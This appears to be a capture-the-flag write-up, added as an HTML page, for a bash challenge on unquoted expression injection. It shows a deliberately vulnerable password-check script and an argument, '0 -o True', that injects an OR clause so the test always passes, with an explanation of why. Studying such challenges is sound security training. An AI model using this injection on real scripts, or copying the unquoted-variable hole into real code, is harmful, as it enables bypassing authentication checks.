@@ -1,0 +1,118 @@
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+
+<div style="background-color: #f471ad; padding: 10px; border: 10px ridge lightgreen;">
+  <h1 id="bash-unquoted-expression-injection">Bash - unquoted expression injection</h1>
+  <h2 id="statement">Statement</h2>
+  <p>Bypass this script’s security to recover the validation password.</p>
+  <h2 id="source-code">Source code</h2>
+  <pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
+      </span>
+      <span class="hljs-comment">#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)</span>
+      PATH=<span class="hljs-string">"/bin:/usr/bin"</span>
+
+      PASS=$(cat .passwd)
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">"<span
+          class="hljs-variable">${1}</span>"</span>; <span class="hljs-keyword">then</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"USAGE : <span class="hljs-variable">$0</span>
+        [password]"</span>
+      <span class="hljs-built_in">exit</span> 1
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span
+        class="hljs-variable">$PASS</span> <span class="hljs-_">-eq</span> <span class="hljs-variable">${1}</span>
+      2&gt;/dev/null; <span class="hljs-keyword">then</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Well done you can validate the challenge with :
+        <span class="hljs-variable">$PASS</span>"</span>
+      <span class="hljs-keyword">else</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Try again ,-)"</span>
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-built_in">exit</span> 0
+    </code></pre>
+  <h2 id="analyze">Analyze</h2>
+  <p>Let&#39;s analyze this code</p>
+  <pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
+      </span>
+      <span class="hljs-comment">#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)</span>
+      PATH=<span class="hljs-string">"/bin:/usr/bin"</span>
+
+      PASS=$(cat .passwd) <span class="hljs-comment"># Target</span>
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">"<span
+          class="hljs-variable">${1}</span>"</span>; <span class="hljs-keyword">then</span> <span class="hljs-comment">#
+        -z is to check if first argument is empty</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"USAGE : <span class="hljs-variable">$0</span>
+        [password]"</span>
+      <span class="hljs-built_in">exit</span> 1
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span
+        class="hljs-variable">$PASS</span> <span class="hljs-_">-eq</span> <span class="hljs-variable">${1}</span>
+      2&gt;/dev/null; <span class="hljs-keyword">then</span> <span class="hljs-comment"># If first arg is equal to
+        flag</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Well done you can validate the challenge with :
+        <span class="hljs-variable">$PASS</span>"</span>
+      <span class="hljs-keyword">else</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Try again ,-)"</span>
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-built_in">exit</span> 0
+    </code></pre>
+  <p>So magic will happen here</p>
+  <pre><code class="lang-bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span
+        class="hljs-variable">$PASS</span> <span class="hljs-_">-eq</span> <span class="hljs-variable">${1}</span>
+      2&gt;/dev/null; <span class="hljs-keyword">then</span>
+    </code></pre>
+  <h2 id="exploitation">Exploitation</h2>
+  <pre><code class="lang-bash">app-script-ch16<span class="hljs-variable">@challenge02</span><span
+        class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./wrapper <span class="hljs-string">"0 -o
+        True"</span>
+      Well done you can validate the challenge with : *************
+    </code></pre>
+  <h2 id="how-does-it-work-">How does it work ?</h2>
+  <p>Like classic injections, our goal is to force the condition to validate.</p>
+  <p>With this argument: <code>&quot;0 -o True&quot;</code> script condition became</p>
+  <pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
+      </span>
+      <span class="hljs-comment">#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)</span>
+      PATH=<span class="hljs-string">"/bin:/usr/bin"</span>
+
+      PASS=$(cat .passwd)
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> -z <span class="hljs-string">"<span
+          class="hljs-variable">${1}</span>"</span>; <span class="hljs-keyword">then</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"USAGE : <span class="hljs-variable">$0</span>
+        [password]"</span>
+      <span class="hljs-built_in">exit</span> 1
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span
+        class="hljs-variable">$PASS</span> <span class="hljs-_">-eq</span> 0 -o True 2&gt;/dev/null; <span
+        class="hljs-keyword">then</span> <span class="hljs-comment"># Condition change here</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Well done you can validate the challenge with :
+        <span class="hljs-variable">$PASS</span>"</span>
+      <span class="hljs-keyword">else</span>
+      <span class="hljs-built_in">echo</span> <span class="hljs-string">"Try again ,-)"</span>
+      <span class="hljs-keyword">fi</span>
+
+      <span class="hljs-built_in">exit</span> 0
+    </code></pre>
+  <p><code>&quot;0 -o True&quot;</code>:</p>
+  <ul>
+    <li><code>0</code> = Allows <code>-eq</code> to achieve its goal</li>
+    <li><code>-o</code> = Is OR in bash conditions</li>
+    <li><code>True</code> = Allows <code>-o</code> to make the condition as True</li>
+  </ul>
+  <p>In pseudo-code, this changes the condition from:</p>
+  <pre><code class="lang-py"><span class="hljs-keyword">if</span> $PASS == <span class="hljs-number">0</span> :
+    </code></pre>
+  <p>to:</p>
+  <pre><code class="lang-py"><span class="hljs-keyword">if</span> $PASS == <span class="hljs-number">0</span> <span
+        class="hljs-literal">or</span> <span class="hljs-literal">True</span> :
+    </code></pre>
+
+</div>
+
+<script>hljs.highlightAll();</script>
